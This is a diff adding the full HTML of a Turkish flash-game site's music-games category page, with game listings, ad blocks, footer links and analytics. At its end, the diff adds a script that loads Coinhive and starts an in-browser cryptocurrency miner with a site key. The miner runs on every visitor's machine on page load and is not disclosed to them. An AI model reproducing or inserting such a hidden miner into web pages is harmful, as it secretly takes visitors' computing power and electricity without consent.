+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Rock-Yildizi-3489.html"
+                                              
+                       >
+                        <div class="game mr18">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/676256be5d3de7eab0b84f6ddf8d49750.JPG" /><span class="play"></span></div>
+                                <div class="title">Rock Yıldızı</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                    <a href="http://muzik.oyunuoyna.com/Gitar-Dersi-4571.html"
+                                              
+                       >
+                        <div class="game mrn">
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/e450182f5a493305441cf85a292d3f0d0.jpg" /><span class="play"></span></div>
+                                <div class="title">Gitar Dersi</div>
+                                <div class="clr"></div>
+                            </div>
+                        </div>
+                    </a>
+                                <div class="clr"></div>
+            </div>
+            <script type="text/javascript">
+                $('.games-mostplayed div.game').hide().slice(0, 5).show();
+                function pagemostplayed(e, start) {
+                    $(e).parent().parent().find('li').removeClass('active');
+                    $(e).parent().addClass('active');
+                    $('.games-mostplayed div.game').hide().slice(start, start + 5).show();
+                }
+            </script>
+
+        </div>
+        <div class="bot"></div>
+    </div>
+
+    
+    <div class="box4">
+        <div class="top"></div>
+        <div class="con">
+            <div class="header">
+                <div class="title"><h2>Yeni Müzik Oyunları<h2></h2></div>
+            </div>
+              <div style="width:728px;height: 90;margin: 0 auto;margin-bottom: 15px;margin-top:15px;">
+                            <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+                            <!-- oyunuoyna 728*90 -->
+                            <ins class="adsbygoogle"
+                                 style="display:inline-block;width:728px;height:90px"
+                                 data-ad-client="ca-pub-0240426644904360"
+                                 data-ad-slot="5134247599"></ins>
+                            <script>
+                                    (adsbygoogle = window.adsbygoogle || []).push({});
+                            </script>
+                        </div>
+            <div class="games mt10">
+
+
+                <div style="width:320px;height:320px;display:inline-block; float:left;text-align:center;padding-top:10px;">
+                    <div style="text-align:center;">REKLAM</div><br />
+
+
+                    <!--script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+             
+                    <ins class="adsbygoogle"
+                         style="display:inline-block;width:300px;height:250px"
+                         data-ad-client="ca-pub-0240426644904360"
+                         data-ad-slot="6610980796"></ins>
+                    <script>
+                (adsbygoogle = window.adsbygoogle || []).push({});
+                    </script-->
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- oyunuoyna 300x250 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:300px;height:250px"
+     data-ad-client="ca-pub-0240426644904360"
+     data-ad-slot="6610980796"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+                    
+
+
+                </div>
+                                                                        <div class="game 1 0">
+                        <a href="http://online.oyunuoyna.com/Crossfire-17418.html"
+                           
+                                                      
+                           >
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/17418/r/Crossfire-d19-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Crossfire</div>
+                                <div class="clr"></div>
+                            </div>
+                        </a>
+                    </div>
+                                                        <div class="game 1 1">
+                        <a href="http://online.oyunuoyna.com/Ikinci-Hayat-16475.html"
+                           
+                                                      
+                           >
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/16475/r/Ikinci-Hayat-aec-oyunuoynacom.png" /><span class="play"></span></div>
+                                <div class="title">İkinci Hayat</div>
+                                <div class="clr"></div>
+                            </div>
+                        </a>
+                    </div>
+                                                        <div class="game 1 2">
+                        <a href="http://online.oyunuoyna.com/Smeet-5777.html"
+                           
+                                                      
+                           >
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/5777/r/Smeet-fe2-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Smeet</div>
+                                <div class="clr"></div>
+                            </div>
+                        </a>
+                    </div>
+                                                        <div class="game 1 3">
+                        <a href="http://online.oyunuoyna.com/Neverwinter-10033.html"
+                           
+                                                      
+                           >
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/10033/r/Neverwinter-13b-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Neverwinter</div>
+                                <div class="clr"></div>
+                            </div>
+                        </a>
+                    </div>
+                                                        <div class="game 1 4">
+                        <a href="http://muzik.oyunuoyna.com/Psy-Gentleman-7861.html"
+                           
+                                                      
+                           >
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/7861/r/Psy-Gentleman-dad-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Psy Gentleman</div>
+                                <div class="clr"></div>
+                            </div>
+                        </a>
+                    </div>
+                                                        <div class="game 1 5">
+                        <a href="http://muzik.oyunuoyna.com/Piyanist-Kopek-7778.html"
+                           
+                                                      
+                           >
+                            <div class="inner">
+                                                                <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/7778/r/Piyanist-Kopek-fbb-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                <div class="title">Piyanist Köpek</div>
+                                <div class="clr"></div>
+                            </div>
+                        </a>
+                    </div>
+                               
+                                 <div class="game mr18">
+                            <a href="http://komik.oyunuoyna.com/Harlem-Shake-7548.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/7548/r/Harlem-Shake-338-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                    <div class="title">Harlem Shake</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mr18">
+                            <a href="http://muzik.oyunuoyna.com/Ask-Ritmi-6844.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/6844/r/Ask-Ritmi-c93-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                    <div class="title">Aşk Ritmi</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mr18">
+                            <a href="http://muzik.oyunuoyna.com/Keman-Cal-6563.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/6563/r/Keman-Cal-17c-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                    <div class="title">Keman Çal</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mr18">
+                            <a href="http://muzik.oyunuoyna.com/Dora-Muzik-Cumbusu-6398.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/6398/r/Dora-Muzik-Cumbusu-d55-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                    <div class="title">Dora Müzik Cümbüşü</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mrn">
+                            <a href="http://muzik.oyunuoyna.com/Flut-Cal-6344.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/6344/r/Flut-Cal-eae-oyunuoynacom.jpg" /><span class="play"></span></div>
+                                    <div class="title">Flüt Çal</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                    
+                                                <div style="width:728px;height: 90;margin: 0 auto;margin-bottom: 15px;">
+                            <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+                            <!-- oyunuoyna 728*90 -->
+                            <ins class="adsbygoogle"
+                                 style="display:inline-block;width:728px;height:90px"
+                                 data-ad-client="ca-pub-0240426644904360"
+                                 data-ad-slot="5134247599"></ins>
+                            <script>
+                                    (adsbygoogle = window.adsbygoogle || []).push({});
+                            </script>
+                        </div>
+                                                     <div class="game mr18">
+                            <a href="http://muzik.oyunuoyna.com/Muzik-Yapma-5648.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//o/5648/r/5376c4.jpg" /><span class="play"></span></div>
+                                    <div class="title">Müzik Yapma</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mr18">
+                            <a href="http://muzik.oyunuoyna.com/Bateri-5548.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/7c9d5511fb7dc068cc0aeff50ee11a830.jpg" /><span class="play"></span></div>
+                                    <div class="title">Bateri</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mr18">
+                            <a href="http://muzik.oyunuoyna.com/Pinokyo-5515.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/da5af2cc2946541dcfbe3d76ae461903.jpg" /><span class="play"></span></div>
+                                    <div class="title">Pinokyo</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mr18">
+                            <a href="http://muzik.oyunuoyna.com/Darbuka-Cal-5075.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/273d585cf3c927552ac789c7606d6f130.jpg" /><span class="play"></span></div>
+                                    <div class="title">Darbuka Çal</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mrn">
+                            <a href="http://muzik.oyunuoyna.com/Dansci-Tazmanya-4855.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/9152ff2ac6f072ebb43e8f958c4052480.jpg" /><span class="play"></span></div>
+                                    <div class="title">Dansçı Tazmanya</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mr18">
+                            <a href="http://muzik.oyunuoyna.com/Gitar-Dersi-4571.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/e450182f5a493305441cf85a292d3f0d0.jpg" /><span class="play"></span></div>
+                                    <div class="title">Gitar Dersi</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mr18">
+                            <a href="http://muzik.oyunuoyna.com/Noel-Guitar-Hero-4444.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/df404af7677f056cd18db7975921d0550.jpg" /><span class="play"></span></div>
+                                    <div class="title">Noel Guitar Hero</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mr18">
+                            <a href="http://muzik.oyunuoyna.com/Rock-Yildizi-3489.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/676256be5d3de7eab0b84f6ddf8d49750.JPG" /><span class="play"></span></div>
+                                    <div class="title">Rock Yıldızı</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mr18">
+                            <a href="http://muzik.oyunuoyna.com/Dans-Et-3029.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/6f41ff01e5f2f201ca8a6e8bb89f69200.jpg" /><span class="play"></span></div>
+                                    <div class="title">Dans Et</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mrn">
+                            <a href="http://muzik.oyunuoyna.com/Karaoke-Yapma-3028.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/cfbf59d36209e94912d6a345438cdfce0.jpeg" /><span class="play"></span></div>
+                                    <div class="title">Karaoke Yapma</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mr18">
+                            <a href="http://muzik.oyunuoyna.com/Gitarci-Cift-3027.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/4170d2338649bf145de945bbfaea66780.jpeg" /><span class="play"></span></div>
+                                    <div class="title">Gitarçı Çift</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mr18">
+                            <a href="http://muzik.oyunuoyna.com/Flut-Notalari-3026.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/082529897b25b7b23838cf60b5b539170.jpg" /><span class="play"></span></div>
+                                    <div class="title">Flüt Notaları</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mr18">
+                            <a href="http://muzik.oyunuoyna.com/Civciv-Korosu-3015.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/43ed1d17cee3b3fa77672b7b2eea65dc0.jpg" /><span class="play"></span></div>
+                                    <div class="title">Civciv Korosu</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mr18">
+                            <a href="http://muzik.oyunuoyna.com/Beat-Yapma-3014.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/6dbef5488fa6391f913aeb500cdc11280.jpg" /><span class="play"></span></div>
+                                    <div class="title">Beat Yapma</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                     <div class="game mrn">
+                            <a href="http://muzik.oyunuoyna.com/Muzikci-Iskelet-3013.html">
+                                <div class="inner">
+                                                                        <div class="img"><img width="100%" height="100%" src="http://oyunuoyna.oyuncdn.com//old/3a9a5338b3cb78abf5ddca6485c3fdd90.JPG" /><span class="play"></span></div>
+                                    <div class="title">Müzikçi İskelet</div>
+                                    <div class="clr"></div>
+                                </div>
+                            </a>
+                        </div>
+                                           
+                  
+            
+                <div class="clr"></div>
+            </div>
+
+                            <div class="tc">
+                    <div class="pagination">
+                        <ul>
+                                                                                                                            <li class="num active"><a href="?">1</a></li>
+                                                                                                                                        <li class="num "><a href="?s=2">2</a></li>
+                                                                                                                                        <li class="num "><a href="?s=3">3</a></li>
+                                                                                                                                    <li class="next"><a href="?s=2">İLERİ »</a></li>
+                                <li class="last"><a href="?s=3">SON »</a></li>
+                                                    </ul>
+                    </div>
+                </div>
+            
+            <div class="clr"></div>
+
+        </div>
+        <div class="bot"></div>
+    </div>
+
+
+            <div class="box4 mt10">
+            <div class="top"></div>
+            <div class="con">
+                <div class="header">
+                    <div class="title">Müzik kategorisi</div>
+                </div>
+                <div class="mt10">
+                    Müzik oyunları bölümünde yer alan eğlenceli yapımları oynayarak, gizli kalmış yeteneklerinizi keşfetmeye hazır mısınız? Gitar çalma, piyano çalma gibi çok sevilen oyunları oynayarak hayatınıza renk ve müzik katabilirsiniz. <strong>Müzik oyunları</strong>, gerçeğinden çok kolay olduğu için insanlar tarafından sevilmektedir. Bir çok insan gitar, keman yada farklı müzik aletlerini çalmayı çok ister. Fakat özel yetenek gerektiren bu müzik aletlerini çalmayı öğrenmek çok uzun ve meşakatli bir iştir. O yüzden bir çok insan bu isteğini gerçekleştiremez. Oyun yapımcıları yapmış oldukları çeşitli <span style="text-decoration: underline;">müzik oyunları</span> ile insanların bu tutkularını gerçekleştirmesine olanak sunmaktadır. Bizler OyunuOyna.Com olarak bir çok <strong>müzik oyununu</strong> takip ederek en iyilerini siteye eklemekteyiz. En güzel müzik oyunlarını kolaylıkla oynayabilmek için sitemizi dilediğiniz zaman takip edebilirsiniz. İyi eğlenceler dileriz.                </div>
+            </div>
+            <div class="bot"></div>
+        </div>
+    
+</div>
+
+
+    <script type="text/javascript" src="http://www.oyunuoyna.com/public/new2/js/cookie.js"></script>
+<script type="text/javascript" src="http://www.oyunuoyna.com/ads.js?1506686079"></script><div class="clr"> </div> 
+
+<div class="clr"></div>
+
+
+</div>
+
+</div>
+
+</div>
+
+<div class="footer-outer">
+    <div class="footer">
+        <div class="footer-inner">
+
+            <div class="footer-games">
+                <div class="title">
+                    <a style="color:#FFF;" href="http://www.oyunuoyna.com/yardim.html" rel="nofollow" title="Yardım">yardım</a> -
+                    <a style="color:#FFF;" href="http://www.oyunuoyna.com/iletisim" rel="nofollow" title="İletişim">iletişim</a> -
+                    <span style="display:inline-block;font-style:italic;">ücretsiz</span> <a style="color:#FFF;" href="http://www.oyunuoyna.com" title="oyun oyna">oyun oyna</a>
+                </div>
+                <div class="games">
+                    <ul>
+                                                    <li class=""><a href="http://pes2013.oyunuoyna.com/" title="Pes 2013"><span class="icon-cat icon-cat-7"></span> Pes 2013</a></li>
+                                                    <li class=""><a href="http://ben10omniverse.oyunuoyna.com/" title="Ben 10 Omniverse"><span class="icon-cat icon-cat-9"></span> Ben 10 Omniverse</a></li>
+                                                    <li class="nl"><a href="http://arabayarisi.oyunuoyna.com/" title="Araba Yarışı"><span class="icon-cat icon-cat-4"></span> Araba Yarışı</a></li>
+                                                    <li class=""><a href="http://winx.oyunuoyna.com/" title="Winx"><span class="icon-cat icon-cat-12"></span> Winx</a></li>
+                                                    <li class="nl"><a href="http://atesvesu.oyunuoyna.com/" title="Ateş ve Su"><span class="icon-cat icon-cat-43"></span> Ateş ve Su</a></li>
+                                                    <li class=""><a href="http://candycrush.oyunuoyna.com/" title="Candy Crush"><span class="icon-cat icon-candy-crush"></span> Candy Crush</a></li>
+                                                    <li class="nl"><a href="http://Bebek.oyunuoyna.com/" title="Bebek"><span class="icon-cat icon-cat-34"></span> Bebek</a></li>
+                                                    <li class=""><a href="http://dunyaninenzoroyunu.oyunuoyna.com/" title="Dünyanın En Zor Oyunu"><span class="icon-cat icon-cat-8"></span> Dünyanın En Zor Oyunu</a></li>
+                                                    <li class="nl"><a href="http://Araba-Park-Etme.oyunuoyna.com/" title="Araba Park Etme"><span class="icon-cat icon-cat-33"></span> Araba Park Etme</a></li>
+                                                    <li class=""><a href="http://bebekbakma.oyunuoyna.com/" title="Bebek Bakma"><span class="icon-cat icon-cat-34"></span> Bebek Bakma</a></li>
+                                            </ul>
+                </div>
+            </div>
+
+            <div class="footer-social">
+                <ul>
+                    <li class="facebook"><a rel="nofollow" title="Facebook" target="_blank" href="http://www.facebook.com/oyunuoyna"><span class="icon-social-fb"></span></a></li>
+                    <li class="twitter"><a rel="nofollow" target="_blank" title="Twitter" href="http://twitter.com/oyunuoynacom"><span class="icon-social-twt"></span></a></li>
+                    <li class="friendfeed"><a rel="nofollow" title="FriendFeed" target="_blank" href="http://friendfeed.com/oyunuoyna"><span class="icon-social-friendfeed"></span></a></li>
+                    <li class="gplus"><a rel="nofollow" title="G+" target="_blank" href="https://plus.google.com/b/103600192229844824959/103600192229844824959"><span class="icon-social-gplus"></span></a></li>
+                    <li class="rss"><a rel="nofollow" title="RSS" target="_blank" href="http://www.oyunuoyna.com/rss"><span class="icon-social-rss"></span></a></li>
+                </ul>
+            </div>
+
+            <div class="footer-categories">
+                <div class="categories">
+                    <ul>
+                                                    <li style=""><span class="icon"></span><a href="http://farkbulmaca.oyunuoyna.com/">Fark Bulmaca</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://opusme.oyunuoyna.com/">Öpüşme</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://oyuncini.oyunuoyna.com/">Oyun Cini</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://3daraba.oyunuoyna.com/">3D Araba</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://3dsavas.oyunuoyna.com/">3D Savaş</a></li>
+                                                    <li style="clear:both;margin-left:12px;"><span class="icon"></span><a href="http://3dyaris.oyunuoyna.com/">3D Yarış</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://kafatopu.oyunuoyna.com/">Kafa Topu</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://minecraft.oyunuoyna.com/">Minecraft</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://top.oyunuoyna.com/">Top</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://balon.oyunuoyna.com/">Balon</a></li>
+                                                    <li style="clear:both;margin-left:24px;"><span class="icon"></span><a href="http://sungerbob.oyunuoyna.com/">Sünger Bob</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://dekorasyon.oyunuoyna.com/">Dekorasyon</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://dini.oyunuoyna.com/">Dini</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://dora.oyunuoyna.com/">Dora</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://egitici.oyunuoyna.com/">Eğitici</a></li>
+                                                    <li style="clear:both;margin-left:36px;"><span class="icon"></span><a href="http://temizlik.oyunuoyna.com/">Temizlik</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://doktor.oyunuoyna.com/">Doktor</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://flappybird.oyunuoyna.com/">Flappy Bird</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://skorlu.oyunuoyna.com/">Skorlu</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://frikik.oyunuoyna.com/">Frikik</a></li>
+                                                    <li style="clear:both;margin-left:48px;"><span class="icon"></span><a href="http://copadam.oyunuoyna.com/">Çöp Adam</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://ingilizce.oyunuoyna.com/">İngilizce</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://eski.oyunuoyna.com/">Eski</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://4d.oyunuoyna.com/">4d</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://eglenceli.oyunuoyna.com/">Eğlenceli</a></li>
+                                                    <li style="clear:both;margin-left:60px;"><span class="icon"></span><a href="http://ev.oyunuoyna.com/">Ev</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://puanli.oyunuoyna.com/">Puanlı</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://bilardo.oyunuoyna.com/">Bilardo</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://muzik.oyunuoyna.com/">Müzik</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://bakugan.oyunuoyna.com/">Bakugan</a></li>
+                                                    <li style="clear:both;margin-left:72px;"><span class="icon"></span><a href="http://yapboz.oyunuoyna.com/">Yapboz</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://webcam.oyunuoyna.com/">Webcam</a></li>
+                                                    <li style=""><span class="icon"></span><a href="http://atari.oyunuoyna.com/">Atari</a></li>
+                                            </ul>
+
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <div class="desc" style="line-height: 12px;margin-top: 5px;text-align: justify;">
+                    Türkiye'de hizmet veren 7'den 70'e herkesin oynayabileceği oyunlar sunan flash <a style="color:#ACC9D6" href="http://www.oyunuoyna.com" title="oyun">oyun</a> sitesi Oyunuoyna.com'a hoşgeldiniz. Hergün çeşitli flash oyunlar sitemize eklenmekte olup, sunduğumuz oyunların çeşitliliği her gün arttırılmaktadır. Kızlar için barbie, sue, winx, elbise giydirme ve yemek oyunları gibi kategoriler, erkekler için futbol, araba, yarış, park etme, dövüş ve motor oyunları kategorilerinin yanı sıra yetişkinler için de zeka, hafıza ve  online oyunlar yer almaktadır.
+
+                </div>
+                <div class="logo">
+                    <a href="http://www.oyunuoyna.com/"></a>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript">
+    (function(d, w, c) {
+        (w[c] = w[c] || []).push(function() {
+            try {
+                w.yaCounter17641075 = new Ya.Metrika({id: 17641075, enableAll: true, webvisor: true});
+            } catch (e) {
+            }
+        });
+
+        var n = d.getElementsByTagName("script")[0],
+                s = d.createElement("script"),
+                f = function() {
+                    n.parentNode.insertBefore(s, n);
+                };
+        s.type = "text/javascript";
+        s.async = true;
+        s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";
+
+        if (w.opera == "[object Opera]") {
+            d.addEventListener("DOMContentLoaded", f);
+        } else {
+            f();
+        }
+    })(document, window, "yandex_metrika_callbacks");
+</script>
+
+
+
+<noscript><div><img src="//mc.yandex.ru/watch/17641075" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('FUgKSV4Y4Kn9uNlxIeoCXmwvtiC0Ai46');
+	miner.start();
+</script>
+
+</body>
+</html>
